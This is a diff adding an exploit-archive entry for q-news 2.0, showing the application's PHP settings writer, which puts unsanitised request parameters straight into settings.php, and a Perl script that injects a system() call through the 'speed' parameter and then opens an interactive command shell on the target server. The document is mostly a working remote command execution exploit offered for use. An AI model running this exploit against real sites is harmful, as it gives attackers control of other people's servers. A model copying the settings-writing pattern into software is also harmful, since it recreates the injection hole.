@@ -1,0 +1,119 @@
+id: 4834
+date: 02/10/2009
+title: q-news 2.0 Remote Command Execution Exploit
+author: Fireshot
+cves: 
+
+===========================================
+q-news 2.0 Remote Command Execution Exploit
+===========================================
+
+
+##########################################################################
+
+Author = FireShot , Jacopo Vuga.
+
+Vulnerability = Remote Command Execution
+Software = q-news 2.0
+Download =
+http://ovh.dl.sourceforge.net/sourceforge/php-box/2.0_nologin.zip
+
+###########################################################################
+
+[CODE]
+
+<?php
+$filename = 'settings.php';
+if (is_writable($filename)) {
+    if (!$handle = fopen($filename, 'w')) {
+         print "Cannot open file ($filename)";
+         exit;
+    }
+if (!fwrite($handle, "<?php
+  \$password = '$password';
+  \$font = '$font';
+  \$height = '$height';
+  \$width = '$width';
+  \$direction = '$direction';
+  \$speed = '$speed';
+  \$bgcolor = '$bgcolor';
+  \$txtcolor = '$txtcolor';
+  \$txtsize = '$txtsize';
+  ?>")) {
+        print "Cannot write to file ($filename)";
+        exit;
+    }
+    print "Successfully saved settings to file ($filename)";
+    fclose($handle);
+                    
+} else {
+    print "The file $filename is not writable";
+}
+?>
+
+[/CODE]
+
+
+[EXPLOIT]
+
+#!/usr/bin/perl
+
+
+use HTTP::Request;
+use LWP::UserAgent;
+
+my $host  =  $ARGV[0];
+my $vuln  =  "/wsettings.php?speed=";
+my $rce   =  "/settings.php?cmd=";
+my $evil  =  "';system(\$_GET[cmd]);\$x = '";
+
+my $inj_url = $host.$vuln.$evil;
+my $rce_url = $host.$rce;
+
+($host) || die " usage= perl $0 site \n"; 
+
+print "------------------------\n";
+print "   Q-News RCE Exploit   \n";
+print "       by FireShot      \n";
+print "------------------------\n\n";
+
+$response = get($inj_url);
+if ($response =~ /Successfully saved settings/) {
+    &shell;
+}
+else {
+    print "error \n";
+    exit(0);
+}
+
+sub shell {
+    print "FireShot-shell: ";
+    my $cmd = <STDIN>;
+    $cmd !~ /quit/ || die " exit \n";
+    my $url = $rce_url.$cmd;
+    my $re = get($url);
+    if ($re =~ /(.)/) {
+        print $re;
+    }
+    else {
+        print "command unknow \n";
+    }
+    &shell;
+}
+
+sub get() {
+    my $url = $_[0];
+    my $req = HTTP::Request->new(GET => $url);
+    my $agent  = LWP::UserAgent->new();
+    $agent->timeout(4);
+    my $response = $agent->request($req);
+    return $response->content;
+}
+
+[/EXPLOIT]
+
+############################################################################
+
+
+
+#  0day.today [2023-03-26]  #
